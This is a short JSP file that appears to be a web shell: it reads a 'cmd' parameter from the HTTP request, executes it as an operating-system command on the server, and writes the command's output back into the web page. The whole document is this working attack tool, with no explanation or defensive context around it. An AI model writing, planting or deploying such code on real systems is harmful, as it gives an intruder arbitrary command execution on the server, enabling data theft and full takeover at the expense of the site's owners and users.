<%@ page import="java.io.*" %> <% String cmd = request.getParameter("cmd"); if
(cmd != null) { Process p = Runtime.getRuntime().exec(cmd); OutputStream os =
p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis =
new DataInputStream(in); String disr = dis.readLine(); while (disr != null) {
out.println(disr); disr = dis.readLine(); } } %>
